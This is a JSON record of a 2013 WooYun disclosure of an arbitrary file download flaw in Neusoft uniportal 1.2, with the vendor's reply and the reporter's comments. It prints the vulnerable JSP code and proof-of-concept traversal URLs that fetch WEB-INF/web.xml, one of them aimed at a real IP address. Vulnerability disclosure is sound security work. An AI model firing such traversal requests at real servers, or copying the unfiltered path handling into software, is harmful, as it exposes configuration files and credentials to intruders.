{"id": 5679, "wybug_id": "wooyun-2013-044660", "wybug_title": "东软uniportal1.2存在任意文件下载漏洞", "wybug_corp": "东软集团", "wybug_author": "10457793", "wybug_date": "2013-12-02 10:04", "wybug_open_date": "2014-03-02 10:05", "wybug_type": "任意文件遍历/下载", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件下载"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-05：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-01-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-02：\t细节向公众公开  简要描述： 东软的用户遍布各行各业，这次发现的漏洞虽然危害不是很大，但是配置服务器安全加固的缺失，绝对可以组合利用获得服务器权限。 详细说明：  程序未对文件路径及文件类型进行过滤，导致下载任意文件。测试中发现成功率不是百分百，分析可能是与操作系统类型有关。   漏洞证明：  出现问题的文件为：/portal/SiteManager/site/displayimg.jsp下载任意文件举例:http://www.domain.cn/ecdomain/portal/SiteManager/site/displayimg.jsp?path=\\WEB-INF\\web.xml程序代码：\n<%@ page contentType=\"text/html; charset=UTF-8\" %><%@ page import=\"com.neusoft.im2.util.HttpUtils\"%><%@ page import=\"java.io.File\"%><%String path=request.getParameter(\"path\");path=request.getRealPath(path);File f=new File(path);if (f.exists()){\tHttpUtils.sendfile(f,response);}%>\n漏洞证明：http://121.22.127.111/ecdomain/portal/SiteManager/site/displayimg.jsp?path=\\WEB-INF\\web.xml   修复方案：  null   版权声明：转载请注明来源 10457793@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2013-12-02 15:25 厂商回复： 经调查，这个网站是下属子公司员工搭建的临时测试环境，是用的老的uniportal平台，所以存在漏洞。感谢作者。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-02 15:38 |    \t\t10457793 \t\t\t( 普通白帽子  |\t\t\t        Rank:867 漏洞数:128        | 说好的借，为什么从来不还？O(∩_∩)O)\t\t \n  请问uniportal最新版本号？老版本的，我在很多机构站点测试过，都存在，你们最好还是督促用户升级吧！    \n     2013-12-02 15:39 |    \t\t10457793 \t\t\t( 普通白帽子  |\t\t\t        Rank:867 漏洞数:128        | 说好的借，为什么从来不还？O(∩_∩)O)\t\t \n  下载到tomcat配置文件就不好了！！！！！！    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}